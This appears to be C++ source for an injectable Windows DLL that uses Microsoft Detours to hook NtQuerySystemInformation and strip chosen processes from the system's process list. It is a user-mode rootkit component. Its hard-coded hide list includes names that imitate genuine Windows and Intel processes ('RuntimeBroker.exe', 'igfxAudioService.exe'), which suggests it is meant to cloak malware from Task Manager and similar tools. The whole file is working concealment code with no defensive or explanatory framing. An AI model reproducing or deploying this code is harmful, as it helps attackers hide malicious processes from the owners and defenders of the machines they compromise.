#define WIN32_LEAN_AND_MEAN 

#include <windows.h>
#include <stdio.h>
#include <string>
#include <stdlib.h>
#include <winuser.h>
#include <Shlwapi.h>
#include <string>
#include <winternl.h>
#include <tchar.h>
#include <strsafe.h>
#include "detours.h"
#include <fstream>

#pragma comment(lib,"shlwapi.lib")

using namespace std;

WCHAR HiddenProcess[][MAX_PATH]{
    L"TestInject32.exe",
    L"TestInject64.exe",
    L"igfxAudioService.exe",
    L"RuntimeBroker.exe"
};
bool IsHiddenProcess(UNICODE_STRING name) {
    if (name.Length == 0)
        return false;

    for (int i = 0; i < sizeof(HiddenProcess) / sizeof(HiddenProcess[0]); i++) {
        if (_wcsnicmp(name.Buffer, HiddenProcess[i], name.Length) == 0)
            return true;
    }
    return false;
}
typedef NTSTATUS(NTAPI* NTQUERYSYSTEMINFORMATION)(
    SYSTEM_INFORMATION_CLASS systemInformationClass, 
    LPVOID systemInformation, 
    ULONG systemInformationLength, 
    PULONG returnLength);

NTQUERYSYSTEMINFORMATION OriginalNtQuerySystemInformation = NULL;


NTSTATUS NTAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS systemInformationClass, 
    LPVOID systemInformation, 
    ULONG systemInformationLength, 
    PULONG returnLength);

void InstallHook(LPCSTR dll, LPCSTR function, LPVOID* originalFunction, LPVOID hookedFunction)
{
	HMODULE module = GetModuleHandleA(dll);
	*originalFunction = (LPVOID)GetProcAddress(module, function);

	if (*originalFunction)
		DetourAttach(originalFunction, hookedFunction);
}

BOOL APIENTRY DllMain(HANDLE hMoudle, DWORD dwReason, LPVOID lpReserved)
{
    switch(dwReason)
    {
    case DLL_PROCESS_ATTACH:
	{
		DetourTransactionBegin();
		DetourUpdateThread(GetCurrentThread());

		InstallHook("ntdll.dll", "NtQuerySystemInformation", (LPVOID*)&OriginalNtQuerySystemInformation, HookedNtQuerySystemInformation);

		DetourTransactionCommit();
	}
        break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:

        break;
    }
    return TRUE;
}

NTSTATUS NTAPI HookedNtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS systemInformationClass,
    LPVOID systemInformation,
    ULONG systemInformationLength,
    PULONG returnLength)
{
    ULONG newReturnLength;
    NTSTATUS status = OriginalNtQuerySystemInformation(
        systemInformationClass,
        systemInformation,
        systemInformationLength,
        &newReturnLength);

    if (returnLength)
        *returnLength = newReturnLength;

    if (NT_SUCCESS(status))
    {
        // Hide processes
        if (systemInformationClass == SYSTEM_INFORMATION_CLASS::SystemProcessInformation)
        {
            for (PSYSTEM_PROCESS_INFORMATION current = (PSYSTEM_PROCESS_INFORMATION)systemInformation, previous = NULL; current;)
            {
                if (IsHiddenProcess(current->ImageName))
                {
                    if (previous)
                    {
                        if (current->NextEntryOffset) previous->NextEntryOffset += current->NextEntryOffset;
                        else previous->NextEntryOffset = 0;
                    }
                    else
                    {
                        if (current->NextEntryOffset) systemInformation = (LPBYTE)systemInformation + current->NextEntryOffset;
                        else systemInformation = NULL;
                    }
                }
                else
                {
                    previous = current;
                }

                if (current->NextEntryOffset) current = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)current + current->NextEntryOffset);
                else current = NULL;
            }
        }
    }
    return status;
}